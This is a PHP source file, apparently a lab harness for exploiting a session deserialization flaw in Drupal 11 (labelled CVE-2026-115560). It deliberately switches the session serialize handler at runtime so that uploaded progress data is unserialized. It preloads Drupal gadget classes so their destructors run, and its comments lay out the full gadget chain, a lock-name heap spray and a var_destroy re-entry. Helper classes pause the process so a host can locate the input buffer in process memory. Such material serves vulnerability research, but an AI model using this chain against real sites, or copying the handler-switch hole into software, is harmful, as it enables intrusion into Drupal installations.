<?php
/*
 * LAB-ONLY CVE-2026-115560 consumer for the stock Drupal 11 P5 gadget.
 *
 * The session file is written by the upload-progress hook under the configured
 * php_serialize handler; this request switches to the "php" handler at runtime
 * and calls session_start(). The decoder splits the session file at the first
 * "|", so the bytes after it (the progress value) are fed to
 * php_var_unserialize() with no application unserialize() sink.
 *
 * The stock Drupal 11 object graph in those bytes reaches:
 *   YamlCacheCollectorDiscovery::__destruct()
 *     -> MenuActiveTrail::destruct()
 *     -> CacheCollector::updateCache()     (8135-byte lock-name spray)
 *     -> MemoryBackend::get() -> prepareItem()
 *     -> unserialize($prepared->data)      (var_destroy re-entry)
 *
 * ?hold=1 records the pid in /tmp/meas_pid and sleeps 20 s after
 * session_start(), so the host can locate the persistent raw session input
 * buffer with /proc/<pid>/mem. No command interface: this file never executes
 * a command and only starts a session.
 */
require __DIR__ . '/vendor/autoload.php';

function vdlog($s) {
    @file_put_contents('/tmp/vd_log', $s . "\n", FILE_APPEND);
}

/* LAB-ONLY measurement helper. A same-length root whose destructor holds at
 * the var_destroy moment, so the host can locate the live session input
 * buffer. It is never used for the stock-gadget fire payload. */
class VdHold
{
    public $pad;
    public function __destruct()
    {
        if (!empty($_GET['hold'])) {
            @file_put_contents('/tmp/meas_pid', getmypid());
            @file_put_contents('/tmp/vd_log', "VdHold dtor pid=" . getmypid() . "\n", FILE_APPEND);
            sleep(20);
        }
    }
}

class VdDtorProbe
{
    public function __destruct()
    {
        @file_put_contents('/tmp/vd_probe', "probe dtor pid=" . getmypid() . "\n", FILE_APPEND);
    }
}

/* Same-length (49 chars) stand-in for the stock root class. The serialized
 * graph and heap allocations are identical; only the destructor holds instead
 * of running the stock chain. LAB measurement only. */
class VdHoldDisc_______________________________________
{
    protected $yamlCacheCollector;
    public function __destruct()
    {
        if (!empty($_GET['hold'])) {
            @file_put_contents('/tmp/meas_pid', getmypid());
            @file_put_contents('/tmp/vd_log', "VdHoldDisc dtor pid=" . getmypid() . "\n", FILE_APPEND);
            sleep(20);
        }
        if (!empty($_GET['chain']) && is_object($this->yamlCacheCollector)) {
            $this->yamlCacheCollector->destruct();
        }
    }
}

vdlog("start pid=" . getmypid() . " status=" . session_status() .
      " handler=" . ini_get('session.serialize_handler'));
if (!empty($_GET['cap'])) {
    $cf = '/tmp/sessions/sess_' . ($_COOKIE['PHPSESSID'] ?? '');
    @copy($cf, '/tmp/vd_capture');
    vdlog("capture " . $cf . " size=" . @filesize($cf));
}
/*
 * The rfc1867 upload-progress path decodes the session with
 * incomplete_classes_only=true, so autoload is disabled during session_start().
 * Preload the stock P5 classes (normal Drupal bootstrap/autoload would have
 * them registered); otherwise they become __PHP_Incomplete_Class and the
 * destructor never runs.
 */
foreach ([
    'Drupal\\Core\\Discovery\\YamlCacheCollectorDiscovery',
    'Drupal\\Core\\Menu\\MenuActiveTrail',
    'Drupal\\Core\\Cache\\CacheCollector',
    'Drupal\\Core\\Cache\\MemoryBackend',
    'Drupal\\Core\\Lock\\NullLockBackend',
    'Drupal\\Component\\Datetime\\Time',
] as $vdclass) {
    class_exists($vdclass);
}
@ini_set('session.serialize_handler', 'php');
$r = @session_start();
vdlog("after start r=" . var_export($r, true) . " status=" . session_status() .
      " sid=" . session_id() . " handler=" . ini_get('session.serialize_handler'));

if (!empty($_GET['hold'])) {
    @file_put_contents('/tmp/meas_pid', getmypid());
    sleep(20);
}

echo "drupal 115560 consumer ok\n";
